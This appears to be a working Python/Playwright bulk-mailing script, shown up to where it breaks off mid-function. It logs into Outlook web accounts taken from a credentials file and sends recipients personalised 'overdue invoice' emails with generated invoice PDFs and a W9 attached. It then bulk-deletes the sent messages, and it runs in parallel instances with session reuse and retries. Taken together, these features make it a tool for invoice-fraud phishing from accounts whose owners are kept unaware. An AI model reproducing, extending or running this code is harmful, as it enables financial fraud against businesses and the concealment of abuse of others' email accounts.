import time
import random
import shutil
import threading
import subprocess
import os
import sys
from pathlib import Path
from datetime import datetime
from playwright.sync_api import sync_playwright

# === MULTI-INSTANCE CONFIG ===
ENABLE_MULTI_INSTANCE = True
NUM_INSTANCES = 2
STAGGER_DELAY = 30

# === RETRY CONFIG ===
ENABLE_RETRY = True
RETRY_FILE = "retry_failed.txt"
MAX_RETRIES = 1 # Number of times to retry each failed email during the retry phase

# === ORIGINAL CONFIG ===
LOGINS_FILE = "logins.txt"
RECIPIENTS_FILE = "input.txt"
STATIC_ATTACHMENT = "W9.pdf"
BASE_SUBJECT = "Re: {company_name} - Overdue Strategic Planning Services Invoice INV-202500015711"
LOG_FILE = "send_log.txt"
EMAILS_PER_ACCOUNT = 4
HEADLESS = False
REPLY_TO = ""
CC_EMAIL = "Crystal Lyne <crystal.lyne@crysls.com>"
BCC_EMAIL = ""

# PDF Generation Config
WKHTMLTOPDF_PATH = r'C:\Program Files\wkhtmltopdf\bin\wkhtmltopdf.exe'
ENABLE_PDF_GENERATION = True
PDF_CLEANUP = True

# Template Config
MESSAGES_FOLDER = "messages"
HTML_TEMPLATE_FILE = "template.html"
BOX_DOMAIN = "crysls.com"

# Attachment Config
ENABLE_ATTACHMENTS = True

# Delete functionality config
MAX_DELETE_RETRIES = 3
DELETE_RETRY_DELAY = 1
SKIP_DELETE_ON_FAILURE = True

# Performance optimizations
FAST_MODE = True
REDUCED_WAITS = True
TIMEOUT_FAST = 5000
TIMEOUT_NORMAL = 8000
INTER_EMAIL_DELAY = 1
COMPOSE_DELAY = 1000

# Try to import PDF support
try:
    import pdfkit
    HAS_PDF_SUPPORT = True
    try:
        if Path(WKHTMLTOPDF_PATH).exists():
            pdfkit_config = pdfkit.configuration(wkhtmltopdf=WKHTMLTOPDF_PATH)
        else:
            pdfkit_config = pdfkit.configuration()
    except Exception as e:
        print(f"[!] PDF config failed: {e}")
        ENABLE_PDF_GENERATION = False
        HAS_PDF_SUPPORT = False
except ImportError:
    print("[!] pdfkit not installed - PDF generation disabled")
    HAS_PDF_SUPPORT = False
    ENABLE_PDF_GENERATION = False

# === TRACKING ===
success_count = 0
fail_count = 0
attempted = 0

# === BULK DELETE FUNCTIONS ===
def check_no_results(page):
    """Check if search returned no results"""
    no_results_indicators = [
        "text=We didn't find anything",
        "text=Try a different keyword",
        "text=No results found",
        "text=No items match your search"
    ]
    
    for indicator in no_results_indicators:
        try:
            if page.locator(indicator).is_visible(timeout=1000):
                return True
        except:
            continue
    return False

def search_and_bulk_delete_sent_emails(page, subject_pattern, max_rounds=10):
    """Search for sent emails and delete them in bulk until all are gone"""
    try:
        print(f"[>] Starting bulk deletion for subject pattern: {subject_pattern}")
        
        round_num = 1
        total_deleted = 0
        
        while round_num <= max_rounds:
            print(f"[>] Bulk deletion Round {round_num}")
            
            try:
                # Find search box
                search_selectors = [
                    "input[aria-label*='Search']",
                    "input[placeholder*='Search']",
                    "input[type='search']"
                ]
                
                search_box = None
                for selector in search_selectors:
                    try:
                        element = page.locator(selector)
                        if element.is_visible(timeout=2000):
                            search_box = element
                            break
                    except:
                        continue
                
                if not search_box:
                    print("[!] Could not find search box")
                    return total_deleted
                
                # Execute search
                search_box.click()
                page.wait_for_timeout(500)
                search_box.fill("")
                search_box.fill(subject_pattern)
                page.keyboard.press("Enter")
                
                # Wait for search results
                print(f"[>] Waiting for search results...")
                page.wait_for_timeout(2000)
                
                # Check if no results found
                if check_no_results(page):
                    if round_num == 1:
                        print("[>] No emails found with this subject pattern")
                    else:
                        print(f"[✓] All emails deleted after {round_num - 1} rounds")
                    break
                
                # Select all results using Ctrl+A
                print(f"[>] Selecting all search results...")
                try:
                    # Click in the results area first
                    results_area = page.locator("[role='listbox'], [data-testid='mail-list'], .ms-List")
                    if results_area.is_visible(timeout=1000):
                        results_area.click()
                        page.wait_for_timeout(500)
                    
                    page.keyboard.press("Control+a")
                    page.wait_for_timeout(500)
                    print("[✓] Selected all with Ctrl+A")
                    
                except:
                    print("[!] Ctrl+A failed, trying checkbox method...")
                    
                    # Alternative: Look for select all checkbox
                    select_selectors = [
                        "[aria-label*='Select all']",
                        "input[type='checkbox'][aria-label*='Select all']",
                        ".ms-Check[aria-label*='Select all']"
                    ]
                    
                    selected = False
                    for selector in select_selectors:
                        try:
                            if page.locator(selector).is_visible(timeout=1000):
                                page.click(selector)
                                page.wait_for_timeout(500)
                                selected = True
                                print(f"[✓] Selected all with checkbox")
                                break
                        except:
                            continue
                    
                    if not selected:
                        print(f"[!] Could not select emails in round {round_num}")
                        break
                
                # Delete selected emails
                print(f"[>] Deleting selected emails...")
                page.keyboard.press("Delete")
                page.wait_for_timeout(500)
                
                # Handle confirmation dialogs
                print(f"[>] Looking for confirmation...")
                
                # Try multiple confirmation methods
                ok_methods = [
                    lambda: page.click("button.fui-Button:has-text('OK')", timeout=2000),
                    lambda: page.click("button:has-text('OK')", timeout=2000),
                    lambda: page.keyboard.press("Enter"),
                    lambda: page.keyboard.press("Space")
                ]
                
                confirmed = False
                for i, method in enumerate(ok_methods):
                    try:
                        method()
                        page.wait_for_timeout(1000)
                        print(f"[✓] Confirmed deletion (method {i+1})")
                        confirmed = True
                        break
                    except:
                        continue
                
                if confirmed:
                    print(f"[✓] Round {round_num} deletion completed")
                    total_deleted += 1
                    round_num += 1
                    page.wait_for_timeout(1000)
                else:
                    print(f"[!] Could not confirm deletion in round {round_num}")
                    page.keyboard.press("Escape")
                    break
            
            except Exception as e:
                print(f"[!] Error in round {round_num}: {e}")
                break
        
        if round_num > max_rounds:
            print(f"[!] Reached maximum rounds ({max_rounds})")
        
        print(f"[✓] Bulk deletion completed. Total deletion rounds: {total_deleted}")
        return total_deleted
        
    except Exception as e:
        print(f"[!] Bulk deletion error: {e}")
        return 0

# === MULTI-INSTANCE SETUP ===
def split_data_in_memory():
    """Split data in memory without creating files"""
    print("📂 Loading and splitting data in memory...")
    
    try:
        with open(LOGINS_FILE, 'r') as f:
            all_logins = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"❌ {LOGINS_FILE} not found!")
        return None
        
    try:
        with open(RECIPIENTS_FILE, 'r', encoding='utf-8') as f:
            all_recipients = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        print(f"❌ {RECIPIENTS_FILE} not found!")
        return None
    
    logins_per_instance = max(1, len(all_logins) // NUM_INSTANCES)
    recipients_per_instance = max(1, len(all_recipients) // NUM_INSTANCES)
    
    print(f"📊 Splitting {len(all_logins)} accounts and {len(all_recipients)} recipients")
    print(f"📊 Each instance: ~{logins_per_instance} accounts, ~{recipients_per_instance} recipients")
    
    instance_data = []
    for i in range(NUM_INSTANCES):
        instance_num = i + 1
        
        start_login = i * logins_per_instance
        end_login = len(all_logins) if i == NUM_INSTANCES - 1 else start_login + logins_per_instance
        instance_logins = all_logins[start_login:end_login]
        
        start_recipient = i * recipients_per_instance
        end_recipient = len(all_recipients) if i == NUM_INSTANCES - 1 else start_recipient + recipients_per_instance
        instance_recipients = all_recipients[start_recipient:end_recipient]
        
        instance_data.append({
            'instance_num': instance_num,
            'logins': instance_logins,
            'recipients': instance_recipients
        })
        
        print(f"✅ Instance {instance_num}: {len(instance_logins)} accounts, {len(instance_recipients)} recipients")
    
    return instance_data

def cleanup_temp_files():
    """Clean up temporary instance files but not the retry file"""
    print("🧹 Cleaning up temporary files...")
    temp_dir = Path("tdata")
    
    if temp_dir.exists():
        try:
            for file_path in temp_dir.iterdir():
                try:
                    if file_path.is_file():
                        file_path.unlink()
                        print(f"🗑️ Removed {file_path}")
                except Exception as e:
                    print(f"[!] Could not remove {file_path}: {e}")
            
            temp_dir.rmdir()
            print(f"🗑️ Removed tdata directory")
        except Exception as e:
            print(f"[!] Could not remove tdata directory: {e}")
    else:
        print("✅ No tdata directory to clean up.")

    print("✅ Cleanup completed!")

def monitor_instances():
    """Monitor all running instances and display live stats"""
    print("📊 Starting live monitoring...")
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        
        print("="*80)
        print("🚀 MULTI-INSTANCE EMAIL AUTOMATION - LIVE MONITOR")
        print("="*80)
        print(f"⏰ Current Time: {datetime.now().strftime('%H:%M:%S')}")
        print()
        
        total_sent = 0
        total_failed = 0
        total_attempted = 0
        instances_running = 0
        instance_stats = {}
        
        if Path(LOG_FILE).exists():
            try:
                with open(LOG_FILE, 'r', encoding='utf-8') as f:
                    content = f.read()
                    
                total_sent = content.count("Status: SENT")
                total_failed = content.count("Status: FAILED")
                total_attempted = total_sent + total_failed
                
                for i in range(1, NUM_INSTANCES + 1):
                    lines = content.split('\n')
                    instance_sent = len([line for line in lines if f"Instance {i}" in line and "Status: SENT" in line])
                    instance_failed = len([line for line in lines if f"Instance {i}" in line and "Status: FAILED" in line])
                    instance_attempted = instance_sent + instance_failed
                    
                    instance_stats[i] = {
                        'sent': instance_sent,
                        'failed': instance_failed,
                        'attempted': instance_attempted,
                        'status': 'RUNNING' if instance_attempted > 0 else 'STARTING'
                    }
                    
                    if instance_attempted > 0:
                        instances_running += 1
                        
            except Exception as e:
                pass
        
        for i in range(1, NUM_INSTANCES + 1):
            stats = instance_stats.get(i, {'sent': 0, 'failed': 0, 'attempted': 0, 'status': 'NOT STARTED'})
            print(f"📧 Instance {i}: {stats['status']:<12} | Sent: {stats['sent']:<3} | Failed: {stats['failed']:<3} | Total: {stats['attempted']:<3}")
        
        print("-" * 80)
        success_rate = (total_sent / total_attempted * 100) if total_attempted > 0 else 0
        print(f"📊 OVERALL: Sent: {total_sent:<3} | Failed: {total_failed:<3} | Total: {total_attempted:<3} | Rate: {success_rate:.1f}%")
        print(f"🔄 Instances Running: {instances_running}/{NUM_INSTANCES}")
        print("="*80)
        
        if instances_running == 0 and total_attempted > 0:
            print("\n🎉 ALL INSTANCES COMPLETED!")
            
            final_report = f"""
FINAL MULTI-INSTANCE REPORT
===========================
Completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Total Instances: {NUM_INSTANCES}
Total Emails Sent: {total_sent}
Total Emails Failed: {total_failed}
Total Emails Processed: {total_attempted}
Success Rate: {success_rate:.1f}%

Instance Breakdown:
"""
            for i in range(1, NUM_INSTANCES + 1):
                stats = instance_stats.get(i, {'sent': 0, 'failed': 0})
                final_report += f"Instance {i}: {stats['sent']} sent, {stats['failed']} failed\n"
            
            final_report += f"\nDetailed log available in: {LOG_FILE}"
            
            with open("final_report.txt", "w") as f:
                f.write(final_report)
            
            print(final_report)
            break
        
        time.sleep(5)

# === ALL YOUR ORIGINAL FUNCTIONS ===
def load_templates():
    """Load message templates from messages folder"""
    templates = []
    messages_path = Path(MESSAGES_FOLDER)
    
    if messages_path.exists():
        for extension in ['*.txt', '*.html']:
            for file_path in messages_path.glob(extension):
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        content = f.read().strip()
                        if content:
                            templates.append(content)
                            print(f"[+] Loaded template: {file_path.name}")
                except Exception as e:
                    print(f"[!] Failed to load template {file_path}: {e}")
    
    if not templates:
        try:
            with open("message.html", "r", encoding="utf-8") as f:
                default_template = f.read()
                templates.append(default_template)
                print("[+] Using default message.html template")
        except FileNotFoundError:
            print("[!] No templates found and no message.html file")
            templates.append("Hello {name}, this is a test message for {company_name}.")
    
    print(f"[+] Total templates loaded: {len(templates)}")
    return templates

def load_html_template():
    """Load HTML template for PDF generation"""
    if not ENABLE_PDF_GENERATION:
        return None
        
    try:
        with open(HTML_TEMPLATE_FILE, 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        print(f"[!] HTML template {HTML_TEMPLATE_FILE} not found")
        return None

def generate_pdf(html_content, recipient_data):
    """Generate personalized PDF from HTML template"""
    if not ENABLE_PDF_GENERATION or not HAS_PDF_SUPPORT:
        return None
        
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        company_clean = recipient_data['company_name'].replace(' ', '_').replace('/', '_').replace('\\', '_')
        pdf_filename = f"invoice_{company_clean}_{timestamp}.pdf"
        pdf_path = Path.cwd() / pdf_filename
        
        print(f"[>] Generating PDF at: {pdf_path}")
        
        pdfkit.from_string(html_content, str(pdf_path), configuration=pdfkit_config)
        
        if pdf_path.exists():
            file_size = pdf_path.stat().st_size
            print(f"[+] Generated PDF: {pdf_filename} (Size: {file_size} bytes)")
            
            with open(pdf_path, 'rb') as f:
                header = f.read(4)
                if header == b'%PDF':
                    print(f"[✓] PDF file validated successfully")
                    return str(pdf_path.resolve())
                else:
                    print(f"[!] Generated file is not a valid PDF (header: {header})")
                    return None
        else:
            print("[!] PDF generation failed - file not created")
            return None
            
    except Exception as e:
        print(f"[!] PDF generation error: {e}")
        return None

def simple_attach_file(page, file_path, description):
    """Optimized file attachment with direct input prioritized"""
    if not file_path or not Path(file_path).exists():
        print(f"[!] File not found: {file_path}")
        return False
    
    abs_path = str(Path(file_path).resolve())
    file_name = Path(file_path).name
    print(f"[>] Attaching {description}: {file_name}")
    
    try:
        print("[>] Trying direct file input method...")
        file_inputs = page.locator("input[type='file']")
        input_count = file_inputs.count()
        
        if input_count > 0:
            print(f"[>] Found {input_count} file inputs, trying each...")
            
            for i in range(input_count):
                try:
                    file_inputs.nth(i).set_input_files(abs_path)
                    
                    wait_time = 2000 if FAST_MODE else 3000
                    page.wait_for_timeout(wait_time)
                    
                    if page.locator(f"text='{file_name}'").is_visible():
                        print(f"[✓] {description} attached via file input #{i+1}")
                        return True
                        
                except Exception as e:
                    print(f"[!] File input #{i+1} failed: {e}")
                    continue
        
        print("[>] Direct input failed, trying file chooser method...")
        attach_selectors = [
            "button[aria-label='Attach file']",
            "button[title='Attach']",
            "button[aria-label='Attach']"
        ]
        
        for selector in attach_selectors:
            try:
                attach_btn = page.locator(selector)
                if attach_btn.is_visible():
                    print(f"[>] Found attach button, using file chooser method...")
                    
                    with page.expect_file_chooser() as fc_info:
                        attach_btn.click()
                    
                    file_chooser = fc_info.value
                    file_chooser.set_files(abs_path)
                    
                    wait_time = 3000 if FAST_MODE else 5000
                    page.wait_for_timeout(wait_time)
                    
                    if page.locator(f"text='{file_name}'").is_visible():
                        print(f"[✓] {description} verified as attached in UI")
                        return True
                    
                    attachment_indicators = [
                        f"[title*='{file_name}']",
                        f"[aria-label*='{file_name}']",
                        "[data-testid*='attachment']",
                        ".attachment",
                        "[class*='attachment']"
                    ]
                    
                    for indicator in attachment_indicators:
                        if page.locator(indicator).is_visible():
                            print(f"[✓] {description} found in attachment area")
                            return True
                    
                    print(f"[!] File chooser completed but attachment not visible in UI")
                    return False
                    
            except Exception as e:
                print(f"[!] Attach button {selector} failed: {e}")
                continue
        
        print(f"[!] All attachment methods failed for {description}")
        return False
        
    except Exception as e:
        print(f"[!] Attachment error: {e}")
        return False

def handle_outlook_popups(page):
    """Enhanced popup handling with better overlay detection"""
    try:
        page.wait_for_timeout(1500 if FAST_MODE else 2500)
        
        if page.locator("text=\"The following files weren't inserted because they aren't supported image file types\"").is_visible():
            print("[!] CRITICAL: Outlook rejected file as unsupported image type")
            try:
                page.click("button[aria-label='Close'], button:has-text('×'), button:has-text('OK')")
                print("[>] Closed file type error popup")
            except:
                page.keyboard.press("Escape")
            return "FILE_TYPE_ERROR"
        
        if page.locator("text='Attachment reminder'").is_visible():
            print("[>] Attachment reminder popup appeared")
            
            has_attachments = (
                page.locator("[data-testid*='attachment']").is_visible() or
                page.locator(".attachment").is_visible() or
                page.locator("[class*='attachment']").is_visible() or
                page.locator("[aria-label*='attachment']").is_visible()
            )
            
            if has_attachments:
                print("[>] Attachments detected, clicking Send to proceed")
                try:
                    page.click("button:has-text('Send')")
                except:
                    page.keyboard.press("Enter")
                return "SENT_WITH_ATTACHMENTS"
            else:
                print("[!] No attachments detected, clicking 'Don't send' to fix")
                try:
                    page.click("button:has-text('Don\\'t send')")
                except:
                    page.keyboard.press("Escape")
                return "NO_ATTACHMENTS_DETECTED"
        
        popup_indicators = [
            "div[role='dialog']",
            "div[class*='modal']",
            "div[class*='popup']",
            "div[aria-modal='true']"
        ]
        
        for indicator in popup_indicators:
            if page.locator(indicator).is_visible():
                print(f"[>] Found popup/modal: {indicator}")
                try:
                    close_selectors = [
                        "button[aria-label='Close']",
                        "button:has-text('×')",
                        "button:has-text('OK')",
                        "button:has-text('Cancel')"
                    ]
                    
                    for close_selector in close_selectors:
                        if page.locator(close_selector).is_visible():
                            page.click(close_selector)
                            print(f"[>] Closed popup with: {close_selector}")
                            break
                    else:
                        page.keyboard.press("Escape")
                        print("[>] Closed popup with Escape key")
                        
                except Exception as e:
                    print(f"[!] Failed to close popup: {e}")
        
        return "NO_POPUP"
        
    except Exception as e:
        print(f"[!] Popup handling error: {e}")
        return "ERROR"

def personalize_content(content, email, name, company_name, domain, username, ceo, address_text, sender_email="", sender_name=""):
    """Apply personalization to content"""
    personalizations = {
        '{email}': email,
        '{name}': name,
        '{company_name}': company_name,
        '{domain}': domain,
        '{username}': username,
        '{ceo}': ceo,
        '{address}': address_text,
        '{box}': BOX_DOMAIN,
        '{sendmail}': sender_email,
        '{sendname}': sender_name
    }
    
    result = content
    for placeholder, value in personalizations.items():
        result = result.replace(placeholder, value)
    
    return result

def load_logins(file_path=LOGINS_FILE):
    """Load login credentials from a specified file."""
    logins = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line.count(":") >= 1:
                    parts = line.split(":", 2)
                    if len(parts) == 2:
                        logins.append([parts[0], parts[1], ""])
                    else:
                        logins.append(parts)
    except FileNotFoundError:
        print(f"[!] Logins file not found: {file_path}")
    return logins

def parse_recipient_line(line):
    """Parses a single recipient line into a dictionary."""
    if ' | ' in line:
        parts = [part.strip() for part in line.split(' | ')]
        if len(parts) >= 6:
            email, name, company_name, domain, username, ceo = parts[:6]
            address_raw = parts[6] if len(parts) >= 7 else "United States"
            return {
                'email': email, 'name': name, 'company_name': company_name,
                'domain': domain, 'username': username, 'ceo': ceo,
                'address_raw': address_raw, 'original_line': line
            }
    elif "@" in line:
        email = line
        username = email.split('@')[0]
        domain = email.split('@')[1]
        company_name = domain.split('.')[0].title()
        return {
            'email': email, 'name': username.title(), 'company_name': company_name,
            'domain': domain, 'username': username, 'ceo': 'CEO',
            'address_raw': 'United States', 'original_line': line
        }
    return None

def load_recipients(file_path=RECIPIENTS_FILE):
    """Load recipient data from a specified file."""
    recipients = []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                recipient_data = parse_recipient_line(line)
                if recipient_data:
                    recipients.append(recipient_data)
                else:
                    print(f"[!] Line {line_num}: Could not parse recipient data")
    except FileNotFoundError:
        print(f"[!] Recipients file {file_path} not found")
    except Exception as e:
        print(f"[!] Error loading recipients from {file_path}: {e}")
    
    print(f"[+] Loaded {len(recipients)} recipients from {file_path}")
    return recipients

def update_logins_file(logins):
    """Update the logins.txt file with detected sender names"""
    with open(LOGINS_FILE, 'w') as f:
        for email, password, sender_name in logins:
            f.write(f"{email}:{password}:{sender_name}\n")

def save_session(context, email):
    """Save browser session for reuse"""
    session_file = f'session_{email.replace("@", "_at_")}.json'
    context.storage_state(path=session_file)

def session_exists(email):
    """Check if session file exists"""
    session_file = f'session_{email.replace("@", "_at_")}.json'
    return Path(session_file).exists()

def write_log(sender, recipient_data, status, attachment_info=""):
    """Write detailed sending results to shared log file and handle retries."""
    instance_num = os.environ.get('INSTANCE_NUM', '1')
    
    # Write to main log file
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        timestamp = datetime.now().isoformat()
        company = recipient_data.get('company_name', 'Unknown')
        f.write(f"{timestamp} | [Instance {instance_num}] From: {sender} | To: {recipient_data['email']} | Company: {company} | Status: {status} | {attachment_info}\n")
    
    # If failed and retry is enabled, write to retry file
    if status == "FAILED" and ENABLE_RETRY:
        try:
            with open(RETRY_FILE, "a", encoding="utf-8") as f:
                f.write(recipient_data['original_line'] + '\n')
        except Exception as e:
            print(f"[!] Could not write to retry file {RETRY_FILE}: {e}")


def detect_sender_name(page):
    """Optimized sender name detection with faster timeouts"""
    try:
        print("[>] Detecting sender name...")
        page.wait_for_timeout(3000 if FAST_MODE else 5000)
        
        try:
            profile_selectors = [
                "button[aria-label*='account'], button[title*='account']",
                "div[class*='profileButton'], button[class*='profile']",
                "button[data-testid*='account'], button[data-testid*='profile']",
                "button[class*='mectrl'], div[class*='mectrl']"
            ]
            
            profile_clicked = False
            for selector in profile_selectors:
                try:
                    profile_element = page.locator(selector).first
                    if profile_element.is_visible():
                        profile_element.click()
                        profile_clicked = True
                        break
                except:
                    continue
            
            if profile_clicked:
                page.wait_for_timeout(2000 if FAST_MODE else 3000)
                
                dropdown_selectors = [
                    "div#mectrl_currentAccount_primary",
                    "div[class*='mectrl_name']",
                    "div[id*='currentAccount']"
                ]
                
                for selector in dropdown_selectors:
                    try:
                        element = page.locator(selector).first
                        if element.is_visible():
                            text = element.text_content().strip()
                            if text and len(text) > 2 and "@" not in text:
                                skip_texts = ["sign out", "view account", "settings"]
                                if not any(skip_text in text.lower() for skip_text in skip_texts):
                                    print(f"[✓] Detected sender name: {text}")
                                    page.keyboard.press("Escape")
                                    return text
                    except:
                        continue
                
                page.keyboard.press("Escape")
        
        except Exception as e:
            print(f"[!] Name detection failed: {e}")
        
        return ""
        
    except Exception as e:
        print(f"[!] Name detection error: {e}")
        return ""

def login_and_save_session(email, password, p):
    """Optimized login with faster timeouts"""
    browser = p.chromium.launch(headless=HEADLESS)
    context = browser.new_context()
    page = context.new_page()
    print(f"[+] Logging in: {email}")
    
    try:
        page.goto("https://outlook.office.com/mail")
        page.fill("input[type='email']", email)
        page.click("input[type='submit']")
        
        page.wait_for_timeout(2000 if FAST_MODE else 3000)
        
        try:
            if page.locator("text=It looks like this email is used with more than one account").is_visible():
                print("[>] Selecting Work or school account...")
                work_account = page.locator("text=Work or school account")
                if work_account.is_visible():
                    work_account.click()
                    page.wait_for_timeout(2000 if FAST_MODE else 3000)
        except:
            pass
        
        page.wait_for_selector("input[type='password']", timeout=TIMEOUT_FAST)
        page.fill("input[type='password']", password)
        page.click("input[type='submit']")
        
        page.wait_for_timeout(3000 if FAST_MODE else 5000)

        try:
            if page.locator("input[id='idBtn_Back']").is_visible():
                page.click("input[id='idBtn_Back']")
        except:
            pass

        page.wait_for_timeout(5000 if FAST_MODE else 8000)
        
        page.wait_for_selector("button[aria-label='New mail'], [aria-label*='mail']", timeout=10000)
        print("[✓] Successfully reached Outlook interface")

        sender_name = detect_sender_name(page)
        save_session(context, email)
        print(f"[✓] Session saved for {email}")
        browser.close()
        return True, sender_name
        
    except Exception as e:
        print(f"[!] Login failed: {e}")
        browser.close()
        return False, ""

def send_multiple_emails(email, recipients_batch, templates, sender_name, p):
    """Send all emails first, then bulk delete them"""
    try:
        browser = p.chromium.launch(headless=HEADLESS)
        session_file = f'session_{email.replace("@", "_at_")}.json'
        context = browser.new_context(storage_state=session_file)
        page = context.new_page()
        
        try:
            page.goto("https://outlook.office.com/mail", timeout=30000)
            page.wait_for_timeout(3000 if FAST_MODE else 5000)
            
            if page.locator("input[type='email']").is_visible() or page.locator("input[type='password']").is_visible():
                print(f"[!] Session expired for {email}, account needs re-login")
                browser.close()
                return False
                
        except Exception as e:
            print(f"[!] Failed to access Outlook for {email}: {e}")
            browser.close()
            return False

        batch_success = True
        emails_sent_successfully = 0
        
        # PHASE 1: Send all emails in the batch
        print(f"[>] PHASE 1: Sending {len(recipients_batch)} emails...")
        
        for i, recipient_data in enumerate(recipients_batch):
            global attempted, success_count, fail_count
            attempted += 1
            
            print(f"\n[>] Processing {recipient_data['email']} ({i+1}/{len(recipients_batch)})")
            
            try:
                address_text = recipient_data['address_raw']
                template = random.choice(templates)
                
                personalized_message = personalize_content(
                    template,
                    recipient_data['email'],
                    recipient_data['name'],
                    recipient_data['company_name'],
                    recipient_data['domain'],
                    recipient_data['username'],
                    recipient_data['ceo'],
                    address_text,
                    email,
                    sender_name
                )
                
                subject = personalize_content(
                    BASE_SUBJECT,
                    recipient_data['email'],
                    recipient_data['name'],
                    recipient_data['company_name'],
                    recipient_data['domain'],
                    recipient_data['username'],
                    recipient_data['ceo'],
                    address_text,
                    email,
                    sender_name
                )
                
                # Generate PDF if enabled
                pdf_path = None
                if ENABLE_PDF_GENERATION:
                    html_template = load_html_template()
                    if html_template:
                        personalized_html = personalize_content(
                            html_template,
                            recipient_data['email'],
                            recipient_data['name'],
                            recipient_data['company_name'],
                            recipient_data['domain'],
                            recipient_data['username'],
                            recipient_data['ceo'],
                            address_text,
                            email,
                            sender_name
                        )
                        pdf_path = generate_pdf(personalized_html, recipient_data)
                
                # Start composing email
                new_mail_selectors = [
                    "button[aria-label='New mail']",
                    "button[title='New mail']",
                    "button:has-text('New')",
                    "button[aria-label='New message']",
                    "button[title='New message']"
                ]
                
                new_mail_clicked = False
                compose_attempts = 0
                max_compose_attempts = 3
                
                while not new_mail_clicked and compose_attempts < max_compose_attempts:
                    compose_attempts += 1
                    print(f"[>] Compose attempt {compose_attempts}/{max_compose_attempts}")
                    
                    for selector in new_mail_selectors:
                        try:
                            page.wait_for_selector(selector, timeout=TIMEOUT_FAST)
                            new_mail_button = page.locator(selector)
                            if new_mail_button.is_visible():
                                print(f"[>] Found New mail button: {selector}")
                                new_mail_button.click()
                                new_mail_clicked = True
                                print(f"[✓] Clicked New mail button")
                                break
                        except:
                            continue
                    
                    if not new_mail_clicked:
                        print("[>] New mail button not found, trying keyboard shortcut...")
                        try:
                            page.keyboard.press("Control+n")
                            new_mail_clicked = True
                            print("[✓] Used Ctrl+N to open compose")
                        except:
                            pass
                    
                    if new_mail_clicked:
                        page.wait_for_timeout(COMPOSE_DELAY)
                        
                        to_field_selectors = [
                            "div[role='textbox'][aria-label='To']",
                            "input[aria-label='To']",
                            "div[aria-label='To']",
                            "[placeholder*='To']",
                            "[aria-label*='To']"
                        ]
                        
                        compose_opened = False
                        for to_selector in to_field_selectors:
                            try:
                                if page.locator(to_selector).is_visible():
                                    print(f"[✓] Compose window opened successfully")
                                    compose_opened = True
                                    break
                            except:
                                continue
                        
                        if not compose_opened:
                            print(f"[!] Compose window didn't open properly, retrying...")
                            new_mail_clicked = False
                            
                            try:
                                page.keyboard.press("Escape")
                                page.wait_for_timeout(1000)
                            except:
                                pass
                        else:
                            break
                    
                    if compose_attempts < max_compose_attempts:
                        print(f"[>] Waiting before retry...")
                        page.wait_for_timeout(2000)

                if not new_mail_clicked:
                    print(f"[X] Failed to open compose window after {max_compose_attempts} attempts")
                    fail_count += 1
                    write_log(email, recipient_data, "FAILED", "Could not open compose window")
                    continue

                # Fill recipient
                to_field_filled = False
                to_field_selectors = [
                    "div[role='textbox'][aria-label='To']",
                    "input[aria-label='To']",
                    "div[aria-label='To']",
                    "[placeholder*='To']",
                    "[aria-label*='To']",
                    "input[type='email']",
                    "div[contenteditable='true'][aria-label*='To']"
                ]
                
                for to_selector in to_field_selectors:
                    try:
                        print(f"[>] Trying To field selector: {to_selector}")
                        to_field = page.locator(to_selector).first
                        
                        if to_field.is_visible():
                            print(f"[>] Found To field, filling with: {recipient_data['email']}")
                            to_field.click()
                            page.wait_for_timeout(500)
                            to_field.clear()
                            to_field.type(recipient_data['email'])
                            page.wait_for_timeout(500)
                            page.keyboard.press("Tab")
                            to_field_filled = True
                            print(f"[✓] To field filled successfully")
                            break
                    except Exception as e:
                        print(f"[!] To field selector {to_selector} failed: {e}")
                        continue

                if not to_field_filled:
                    print(f"[X] Failed to fill To field for {recipient_data['email']}")
                    fail_count += 1
                    write_log(email, recipient_data, "FAILED", "Could not find or fill To field")
                    
                    try:
                        page.keyboard.press("Escape")
                    except:
                        pass
                    continue

                # Handle CC
                if CC_EMAIL:
                    try:
                        try:
                            cc_button = page.locator("button[title='Show Cc & Bcc']")
                            if cc_button.is_visible():
                                cc_button.click()
                                page.wait_for_timeout(500)
                        except:
                            pass
                        
                        cc_box = page.locator("div[role='textbox'][aria-label='Cc']")
                        cc_box.click()
                        cc_box.type(CC_EMAIL)
                        page.keyboard.press("Tab")
                        print(f"[✓] CC added: {CC_EMAIL}")
                    except Exception as e:
                        print(f"[!] Could not set CC: {e}")

                # Fill subject
                page.wait_for_selector("input[placeholder='Add a subject']", timeout=TIMEOUT_FAST)
                page.fill("input[placeholder='Add a subject']", subject)

                # Fill message body
                try:
                    editor_div = page.locator("div[role='textbox'][aria-label*='Message body'][contenteditable='true']")
                    editor_div.wait_for(state="visible", timeout=TIMEOUT_FAST)
                    editor_div.evaluate("(el, html) => el.innerHTML = html", personalized_message)
                    print("[✓] Body injected")
                except Exception as e:
                    print(f"[!] Message body failed: {e}")
                    continue

                # Handle attachments (YOUR PERFECT LOGIC)
                attachment_info = []
                if ENABLE_ATTACHMENTS:
                    if pdf_path:
                        if simple_attach_file(page, pdf_path, "Generated PDF"):
                            attachment_info.append(f"PDF: {Path(pdf_path).name}")
                    
                    if STATIC_ATTACHMENT and Path(STATIC_ATTACHMENT).exists():
                        if simple_attach_file(page, STATIC_ATTACHMENT, "Static file"):
                            attachment_info.append(f"Static: {STATIC_ATTACHMENT}")

                # Send the email
                try:
                    print("[>] Preparing to send email...")
                    page.wait_for_timeout(4000)
                    
                    send_selectors = [
                        "button[aria-label='Send']",
                        "button[title*='Send']",
                        "button:has-text('Send')",
                        "[id*='send'], [id*='Send']",
                        "button[type='submit']",
                        "button[class*='send'], button[class*='Send']"
                    ]
                    
                    send_clicked = False
                    
                    for selector in send_selectors:
                        try:
                            send_button = page.locator(selector).first
                            if send_button.is_visible():
                                print(f"[>] Found Send button with selector: {selector}")
                                
                                send_button.scroll_into_view_if_needed()
                                page.wait_for_timeout(500)
                                
                                click_methods = [
